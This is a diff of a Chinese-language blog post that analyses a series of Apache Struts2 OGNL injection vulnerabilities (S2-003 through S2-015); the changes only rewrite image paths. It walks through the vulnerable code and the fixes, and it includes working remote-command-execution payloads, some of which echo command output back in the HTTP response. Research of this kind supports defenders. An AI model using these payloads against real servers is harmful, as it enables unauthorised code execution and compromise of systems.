 <h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Struts2在处理参数内容时，将调用<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>函数，填充到OgnlVauleStack的context上下文里。</p>
-<p><img src="/assets/talk_about_struts2/image-20200430155156109.png" alt="image-20200430155156109"></p>
+<p><img src="image-20200430155156109.png" alt="image-20200430155156109"></p>
 <p>这里会先过一次<code>acceptableName</code>的检查（2.0.8版本）</p>
-<p><img src="/assets/talk_about_struts2/image-20200430155231489.png" alt="image-20200430155231489"></p>
+<p><img src="image-20200430155231489.png" alt="image-20200430155231489"></p>
 <p>不能出现<code>=</code>、<code>,</code>、<code>#</code>、<code>:</code>以及被排除在外的参数名</p>
-<p><img src="/assets/talk_about_struts2/image-20200430155418664.png" alt="image-20200430155418664"></p>
+<p><img src="image-20200430155418664.png" alt="image-20200430155418664"></p>
 <p>只有通过了acceptableName函数的检查才能继续往下走，所以我们必须绕过上面的几个问题，这里漏洞发现者用了unicode编码来绕过检测。</p>
 <p><code>ognl.JavaCharStream#readChar</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200430232206989.png" alt="image-20200430232206989"></p>
+<p><img src="image-20200430232206989.png" alt="image-20200430232206989"></p>
 <p>当遇到<code>\u</code>unicode编码，会做一次转换，比如<code>\u0040</code>会被转成<code>@</code></p>
 <p>而<code>acceptableName</code>函数并没有考虑unicode编码的方式，导致其形同虚设。</p>
 <p>回到<code>setParameters</code>，后续调用了<code>OgnlValueStack.setValue</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200430232635455.png" alt="image-20200430232635455"></p>
+<p><img src="image-20200430232635455.png" alt="image-20200430232635455"></p>
 <p>这里最终到了<code>OgnlUtil.setValue</code>计算OGNL表达式</p>
 <h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><p>来看一个调用命令执行的POC</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure>
 <p>先来看第一句，该条ognl表达式用于开启方法执行，因为在调用<code>setParameters</code>之前，开发人员考虑到了参数执行OGNL表达式的风险，所以提前关闭了函数调用执行</p>
-<p><img src="/assets/talk_about_struts2/image-20200430234629782.png" alt="image-20200430234629782"></p>
+<p><img src="image-20200430234629782.png" alt="image-20200430234629782"></p>
 <p>设置完了之后，再还原回来</p>
 <p>但是OGNL表达式对于上下文的内容是可控的，我们可以在进行函数调用前，将context里的<code>xwork.MethodAccessor.denyMethodExecution</code>设为<code>false</code>， 这样第二句poc就可以执行函数调用了。</p>
 <p>所以在发送这两条POC时，需要控制好设置false在前，执行在后（ascii排序，可以看回显poc的处理）</p>
@@ -323,19 +323,19 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// 执行命令</span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d\u0023context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\').getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// 获取response，回显数据</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure>
 <p>这里poc的先后顺序用到了第一个位置，实际的ognl表达式放到了第二个位置<code>(1)((2)(3))</code></p>
 <h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>xwork&gt;=2.0.6 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>多了以下代码</p>
-<p><img src="/assets/talk_about_struts2/image-20200507101610804.png" alt="image-20200507101610804"></p>
+<p><img src="image-20200507101610804.png" alt="image-20200507101610804"></p>
 <p>低版本用的直接是已存在的OgnlValueStack，从2.0.6开始，使用了一个空的stack来处理参数的解析</p>
 <p>并且从这个版本开始多了SecurityMemberAccess，用来限制ognl表达式中函数调用</p>
 <p>在<code>ognl.OgnlRuntime#callAppropriateMethod</code>调用函数前，会去判断函数是否可被访问(method不为null)</p>
-<p><img src="/assets/talk_about_struts2/image-20200507102155210.png" alt="image-20200507102155210"></p>
+<p><img src="image-20200507102155210.png" alt="image-20200507102155210"></p>
 <p>其实这边<code>isMethodAccessible</code>的返回结果无所谓，但是不能在这个函数调用时出错，出错的话也就走不到<code>invokeMethod</code></p>
 <p>看一下具体的实现，<code>isMethodAccessible</code>的判断依赖于<code>SecurityMemberAccess</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200507102334789.png" alt="image-20200507102334789"></p>
-<p><img src="/assets/talk_about_struts2/image-20200507103428140.png" alt="image-20200507103428140"></p>
+<p><img src="image-20200507102334789.png" alt="image-20200507102334789"></p>
+<p><img src="image-20200507103428140.png" alt="image-20200507103428140"></p>
 <p>这里我们主要看<code>isAcceptableProperty</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200507103621957.png" alt="image-20200507103621957"></p>
-<p><img src="/assets/talk_about_struts2/image-20200507103632321.png" alt="image-20200507103632321"></p>
-<p><img src="/assets/talk_about_struts2/image-20200507103642250.png" alt="image-20200507103642250"></p>
+<p><img src="image-20200507103621957.png" alt="image-20200507103621957"></p>
+<p><img src="image-20200507103632321.png" alt="image-20200507103632321"></p>
+<p><img src="image-20200507103642250.png" alt="image-20200507103642250"></p>
 <p>下端点调试你会发现这个版本acceptProperties为空，而excludeProperties非空，所以在调用<code>isExclude</code>函数时，正则调用<code>pattern.matcher(null)</code>会报错，也就无法达到调用函数的目的了（<code>propertiesName</code>为null）。</p>
 <p>所以如果要绕过这个版本的限制，首先需要解决的是这个函数的报错问题，看S2-005</p>
 <h2 id="3-S2-005"><a href="#3-S2-005" class="headerlink" title="3. S2-005"></a>3. <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">S2-005</a></h2><p>影响版本：struts2.0.0 - 2.1.8.1</p>
@@ -346,7 +346,7 @@
 <p>poc里的第一行做的就是这个事情，将<code>excludeProperties</code>置为空集合</p>
 <p>这里看一下为什么以<code>#_memberAccess</code>的方式可以访问到<code>OgnlContext</code>对象的<code>memberAccess</code>属性</p>
 <p><code>ognl.OgnlContext#get</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200507110201209.png" alt="image-20200507110201209"></p>
+<p><img src="image-20200507110201209.png" alt="image-20200507110201209"></p>
 <p>从<code>OgnlContext</code>上下文获取内容，首先会判断是否在<code>RESERVED_KEYS</code>集合里，如果存在，则相应的调用他的getters，如果不存在，则从当前的上下文里去找这个key。</p>
 <p>所以<code>#_memeberAccess</code>实际获取的是<code>OgnlContext</code>的<code>memeberAccess</code>属性内容</p>
 <p>还有出现变化的地方，由于现在context里是没有response对象可以获取的，所以在处理回显的时候我们需要找另外的方法</p>
@@ -355,18 +355,18 @@
 <h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>xwork&gt;=2.2.1.1，对参数名做了更为细致的正则检查<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code></p>
 <h2 id="4-S2-007"><a href="#4-S2-007" class="headerlink" title="4. S2-007"></a>4. S2-007</h2><p>这里跟S2-008里面的第一个漏洞一样</p>
 <p><code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200509111903026.png" alt="image-20200509111903026"></p>
+<p><img src="image-20200509111903026.png" alt="image-20200509111903026"></p>
 <p>value为我们传入的数据，过了一次getOverrideExpr</p>
-<p><img src="/assets/talk_about_struts2/image-20200509111939166.png" alt="image-20200509111939166"></p>
+<p><img src="image-20200509111939166.png" alt="image-20200509111939166"></p>
 <p>对我们的输入围上了单引号，这里如果我们的payload为<code>&#39;+xxxx+&#39;</code>，这里的xxxx就逃逸出来了，而不单单是字符串了</p>
-<p><img src="/assets/talk_about_struts2/image-20200509112218065.png" alt="image-20200509112218065"></p>
+<p><img src="image-20200509112218065.png" alt="image-20200509112218065"></p>
 <p>后续将处理好的数据放到了stack的overrides里面</p>
 <p>而实际触发的地方跟S2-001一样，是在解析JSP的时候造成的</p>
-<p><img src="/assets/talk_about_struts2/image-20200509114347567.png" alt="image-20200509114347567" style="zoom:50%;"></p>
+<p><img src="talk_about_struts2/image-20200509114347567.png" alt="image-20200509114347567" style="zoom:50%;"></p>
 <p>在<code>tryFIndValue</code>函数中，从stack的overrides中取出前面加了单引号的数据，并在后续调用<code>Ognl.getValue</code>，导致了Ognl表达式的执行。</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (#_memberAccess.allowStaticMethodAccess=true,#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,@java.lang.Runtime@getRuntime().exec('</span>open /System/Applications/Calculator.app<span class="string">')) +'</span></span><br></pre></td></tr></table></figure>
 <p>xwork&gt;=2.2.3，ognl表达式计算时，调用函数的函数判断<code>isAcceptableProperty</code>如果name为null直接返回true，所以我们不用像s2-005那样把<code>excludeProperties</code>置为空集合。</p>
-<p><img src="/assets/talk_about_struts2/image-20200509120444634.png" alt="image-20200509120444634"></p>
+<p><img src="image-20200509120444634.png" alt="image-20200509120444634"></p>
 <p>但是从这里开始，<code>allowStaticMethodAccess</code>默认为false，我们需要将其置为true，才能正常执行静态函数。</p>
 <p>所以POC第一二句都是在解除限制，第三句执行命令</p>
 <p>写一下回显的POC</p>
@@ -375,10 +375,10 @@
 <p>其中1跟S2-007类似，3不看了，主要关注2和4</p>
 <h3 id="CookieInterceptor"><a href="#CookieInterceptor" class="headerlink" title="CookieInterceptor"></a>CookieInterceptor</h3><p>这里的原理同S2-005类似，这里看代码比较直观，没有搭环境调了</p>
 <p><code>org.apache.struts2.interceptor.CookieInterceptor#intercept</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200509202547849.png" alt="image-20200509202547849"></p>
-<p><img src="/assets/talk_about_struts2/image-20200509202741614.png" alt="image-20200509202741614"></p>
+<p><img src="image-20200509202547849.png" alt="image-20200509202547849"></p>
+<p><img src="image-20200509202741614.png" alt="image-20200509202741614"></p>
 <p>这里会到<code>OgnlValueStack.setValue</code>，也就是后续调用<code>Ognl.setValue</code>，用<code>((1)(2))(3)</code>的方式来执行任意OGNL表达式</p>
-<h3 id="DebuggingInterceptor"><a href="#DebuggingInterceptor" class="headerlink" title="DebuggingInterceptor"></a>DebuggingInterceptor</h3><p><img src="/assets/talk_about_struts2/image-20200509204915751.png" alt="image-20200509204915751"></p>
+<h3 id="DebuggingInterceptor"><a href="#DebuggingInterceptor" class="headerlink" title="DebuggingInterceptor"></a>DebuggingInterceptor</h3><p><img src="image-20200509204915751.png" alt="image-20200509204915751"></p>
 <p>当开启开发者模式时，传入<code>debug=command&amp;expression=xxxx</code>，即可执行OGNL表达式</p>
 <h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?debug=command&amp;expression=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))</span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res))</span><br></pre></td></tr></table></figure>
 <h2 id="6-S2-009"><a href="#6-S2-009" class="headerlink" title="6. S2-009"></a>6. <a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="noopener">S2-009</a></h2><p>影响范围：2.0.0 - 2.3.1.1</p>
@@ -388,76 +388,76 @@
 <p>上面代码中的假设，我们可以通过传入<code>?param=xxx</code>的方式带入</p>
 <p>注意这里的param需要是当前Action的一个类属性（也就是原本就存在的参数名），比如原本表单里就有password，那么你就可以在password里面填充OGNL表达式</p>
 <p>因为在计算OGNL表达式<code>(password)(bla)</code>的时候(解析出两个ASTProperty)</p>
-<p><img src="/assets/talk_about_struts2/image-20200511171450014.png" alt="image-20200511171450014"></p>
+<p><img src="image-20200511171450014.png" alt="image-20200511171450014"></p>
 <p>后续再执行过程中，会去查找当前的action里面是否含有这个属性</p>
-<p><img src="/assets/talk_about_struts2/image-20200511171056619.png" alt="image-20200511171056619"></p>
+<p><img src="image-20200511171056619.png" alt="image-20200511171056619"></p>
 <p><code>com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200511204523185.png" alt="image-20200511204523185"></p>
+<p><img src="image-20200511204523185.png" alt="image-20200511204523185"></p>
 <p>如果当前存在这个属性的时候，返回其内容</p>
 <p>后续就是跟<code>(1)(2)</code>这种执行的原理一样，会以<code>(1)</code>作为node调用getValue。</p>
 <p>这里巧妙的就是利用这种中转的方式，规避了参数名的正则检测</p>
 <h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&amp;z[(password)(bla)]=<span class="number">1</span></span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">?password=(%<span class="number">23</span>_memberAccess.allowStaticMethodAccess=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&amp;z[(password)(bla)]=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 <h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>改进了正则</p>
-<p><img src="/assets/talk_about_struts2/image-20200511222139049.png" alt="image-20200511222139049"></p>
+<p><img src="image-20200511222139049.png" alt="image-20200511222139049"></p>
 <p>增加了<code>setParameter</code>函数，默认设置表达式不可执行</p>
-<p><img src="/assets/talk_about_struts2/image-20200511223638532.png" alt="image-20200511223638532"></p>
-<p><img src="/assets/talk_about_struts2/image-20200519154216690.png" alt="image-20200519154216690"></p>
+<p><img src="image-20200511223638532.png" alt="image-20200511223638532"></p>
+<p><img src="image-20200519154216690.png" alt="image-20200519154216690"></p>
 <h2 id="7-S2-012"><a href="#7-S2-012" class="headerlink" title="7. S2-012"></a>7. S2-012</h2><p>影响范围：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2</p>
 <blockquote>
 <p>The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.<br>This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p>
 </blockquote>
 <p>看描述可以知道是struts2在处理redirect的时候出现的问题。</p>
-<p><img src="/assets/talk_about_struts2/image-20200513145252050.png" alt="image-20200513145252050"></p>
-<p><img src="/assets/talk_about_struts2/image-20200513145417046.png" alt="image-20200513145417046"></p>
+<p><img src="image-20200513145252050.png" alt="image-20200513145252050"></p>
+<p><img src="image-20200513145417046.png" alt="image-20200513145417046"></p>
 <p>结果返回后回去调用<code>ServletRedirectResult</code>来处理</p>
 <p>来看看该对象的实际处理函数<code>org.apache.struts2.dispatcher.ServletRedirectResult#execute</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200513145546225.png" alt="image-20200513145546225"></p>
-<p><img src="/assets/talk_about_struts2/image-20200513150115678.png" alt="image-20200513150115678"></p>
+<p><img src="image-20200513145546225.png" alt="image-20200513145546225"></p>
+<p><img src="image-20200513150115678.png" alt="image-20200513150115678"></p>
 <p>在父类execute函数调用了<code>conditionalParse</code>函数</p>
-<p><img src="/assets/talk_about_struts2/image-20200513150240332.png" alt="image-20200513150240332"></p>
+<p><img src="image-20200513150240332.png" alt="image-20200513150240332"></p>
 <p>这里出现了我们比较熟悉的<code>TextParseUtil.translateVariables</code>，S2-001就是由这个函数来处理String类型转化的。</p>
 <p>此时param为我们在struts.xml中的配置<code>edit.action?skillName=${currentSkill.name}</code></p>
 <p>前面分析过<code>translateVariables</code>，这里直切主题</p>
 <p>出问题的地方跟S2-001一样</p>
-<p><img src="/assets/talk_about_struts2/image-20200513151342610.png" alt="image-20200513151342610"></p>
+<p><img src="image-20200513151342610.png" alt="image-20200513151342610"></p>
 <p>触发总共分为两步：</p>
 <ol>
 <li><p>将xml配置中<code>${currentSkill.name}</code>解析成传入的值，此时stack.findValue会去找到前面处理好后的Result里面的currentSkill.name的值</p>
-<p><img src="/assets/talk_about_struts2/image-20200513151651915.png" alt="image-20200513151651915"></p>
+<p><img src="talk_about_struts2/image-20200513151651915.png" alt="image-20200513151651915"></p>
 </li>
 <li><p>由于<code>translateVariables</code>的解析OGNL表达式有两种<code>$</code>、<code>%</code>，并且是循环去处理的</p>
-<p><img src="/assets/talk_about_struts2/image-20200513151842698.png" alt="image-20200513151842698"></p>
+<p><img src="talk_about_struts2/image-20200513151842698.png" alt="image-20200513151842698"></p>
 <p>首先是去处理<code>$</code>，将<code>${currentSkill.name}</code>解析成具体的值，并且将result的值置为他的内容</p>
 <p>虽然已经修复了循环递归执行的问题(s2-001会执行两层<code>${}</code>)，但是因为还循环去处理<code>%</code>，那么仍然可以达到循环递归计算的效果<code>${另一层以%起始的ognl表达式}</code>，所以POC里面需要用<code>%{}</code>来写入OGNL表达式</p>
 </li>
 </ol>
 <p>所以对于S2-012来说，配置中<code>${currentSkill.name}</code>是至关重要的</p>
 <h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>由于我前面分析的是<code>2.2.3</code>版本，后续的版本的<code>translateVariables</code>变化有点大，其修复版本</p>
-<p><img src="/assets/talk_about_struts2/image-20200513155116772.png" alt="image-20200513155116772"></p>
+<p><img src="image-20200513155116772.png" alt="image-20200513155116772"></p>
 <p>增加了pos来做起始位置来查找<code>${}%{}</code>，在第一次表达式执行完成后会更新pos值，来防止二次OGNL表达式执行</p>
 <h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;</span><br><span class="line">// 回显POC</span><br><span class="line">%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125;</span><br></pre></td></tr></table></figure>
 <h2 id="8-S2-013-S2-014"><a href="#8-S2-013-S2-014" class="headerlink" title="8. S2-013/S2-014"></a>8. S2-013/S2-014</h2><p>影响范围：Struts 2.0.0 - Struts 2.3.14.1</p>
 <p>这次的原理跟S2-001类似，只是问题出在解析<code>&lt;s:a&gt;</code>、<code>&lt;s:url&gt;</code>，当这两个标签支持<code>includeParams</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200514151446611.png" alt="image-20200514151446611"></p>
+<p><img src="image-20200514151446611.png" alt="image-20200514151446611"></p>
 <p>当当前的href为空时，会用当前url来填充href，也就是在<code>buildUrl</code>时导致的OGNL表达式的执行</p>
 <p>这里不具体分析了，看一下他的执行栈</p>
-<p><img src="/assets/talk_about_struts2/image-20200514150911888.png" alt="image-20200514150911888" style="zoom:50%;"></p>
+<p><img src="talk_about_struts2/image-20200514150911888.png" alt="image-20200514150911888" style="zoom:50%;"></p>
 <p><code>org.apache.struts2.views.util.DefaultUrlHelper#translateVariable</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200514151844894.png" alt="image-20200514151844894"></p>
+<p><img src="image-20200514151844894.png" alt="image-20200514151844894"></p>
 <p>也同样是使用String转换时出现的OGNL表达式执行</p>
 <h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'open /System/Applications/Calculator.app'</span>))&#125;</span><br><span class="line"><span class="comment">// 回显POC</span></span><br><span class="line">?fakeParam=%&#123;(%<span class="number">23</span>_memberAccess[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>,%<span class="number">23</span>context[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>,%<span class="number">23</span>ret=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>().exec(<span class="string">'id'</span>),%<span class="number">23</span>isr=<span class="keyword">new</span> java.io.InputStreamReader(%<span class="number">23</span>ret.getInputStream()),%<span class="number">23</span>br=<span class="keyword">new</span> java.io.BufferedReader(%<span class="number">23</span>isr),%<span class="number">23</span>res=<span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">2000</span>],%<span class="number">23</span>br.read(%<span class="number">23</span>res),%<span class="number">23</span>writer=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse</span>().getWriter(),%<span class="number">23</span>writer.println(<span class="keyword">new</span> java.lang.String(%<span class="number">23</span>res)),%<span class="number">23</span>writer.flush(),%<span class="number">23</span>writer.close())&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p><img src="/assets/talk_about_struts2/image-20200514152500049.png" alt="image-20200514152500049"></p>
-<p><img src="/assets/talk_about_struts2/image-20200514152517255.png" alt="image-20200514152517255"></p>
+<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p><img src="image-20200514152500049.png" alt="image-20200514152500049"></p>
+<p><img src="image-20200514152517255.png" alt="image-20200514152517255"></p>
 <p>这里<code>org.apache.struts2.views.util.DefaultUrlHelper</code>不再使用TextParseUtil来处理</p>
 <h2 id="9-S2-015"><a href="#9-S2-015" class="headerlink" title="9. S2-015"></a>9. S2-015</h2><p>影响范围：Struts 2.0.0 - Struts 2.3.14.2</p>
 <p>S2-015一共有两种：</p>
 <p>第一种漏洞原理跟S2-012类似，这次问题不是出在重定向，而是在解析具体的action name时出现的问题</p>
-<p><img src="/assets/talk_about_struts2/image-20200514165546294.png" alt="image-20200514165546294"></p>
+<p><img src="image-20200514165546294.png" alt="image-20200514165546294"></p>
 <p>这里的<code>{1}</code>会被替换成<code>xxx.action</code>的<code>xxx</code>，这里的<code>xxx</code>如果被我们替换成OGNL表达式，会在后续的<code>TextParseUtil.translateVariables</code>得到执行，过程跟S2-012一样，不再叙述。</p>
 <p>第二种是结果由httpheader来处理时，会将我们的<code>${message}</code>嵌套执行</p>
-<p><img src="/assets/talk_about_struts2/image-20200514202040764.png" alt="image-20200514202040764"></p>
+<p><img src="image-20200514202040764.png" alt="image-20200514202040764"></p>
 <p><code>org.apache.struts2.dispatcher.HttpHeaderResult#execute</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200514202919865.png" alt="image-20200514202919865"></p>
+<p><img src="image-20200514202919865.png" alt="image-20200514202919865"></p>
 <p>跟S2-012一样，解析执行<code>${另一层以%起始的OGNL表达式}</code></p>
 <h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 摘自https://www.freebuf.com/vuls/217482.html</span><br><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br><span class="line">// 第二种</span><br><span class="line">？message=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
 <p>这里比较特殊的是这里对原有<code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code>，改成了</p>
@@ -465,9 +465,9 @@
 <p>为什么要通过这种方式来写入呢？</p>
 <p>先来看OGNL是怎么setValue的</p>
 <p><code>ognl.OgnlRuntime#setFieldValue</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200514173311368.png" alt="image-20200514173311368"></p>
+<p><img src="image-20200514173311368.png" alt="image-20200514173311368"></p>
 <p>而此时这里我们要设置的<code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]</code></p>
-<p><img src="/assets/talk_about_struts2/image-20200514173631503.png" alt="image-20200514173631503"></p>
+<p><img src="image-20200514173631503.png" alt="image-20200514173631503"></p>
 <p>是final类型，我们不能使用普通的方式改变他的值，只能通过上面的反射的方式来进行修改。</p>
 <p>这里的改变是从struts2 2.3.14.1版本开始的，意味着高于这个版本的以后的poc只能通过这种方式来设置</p>
 <p>除了上面通过反射机制来进行绕过，我们也可以直接用构造器的方法来执行，比如<code>new ProccessBuilder(&#39;id&#39;).start()</code></p>
@@ -477,9 +477,9 @@
 <p>执行链路跟S2-012一样，不作分析了</p>
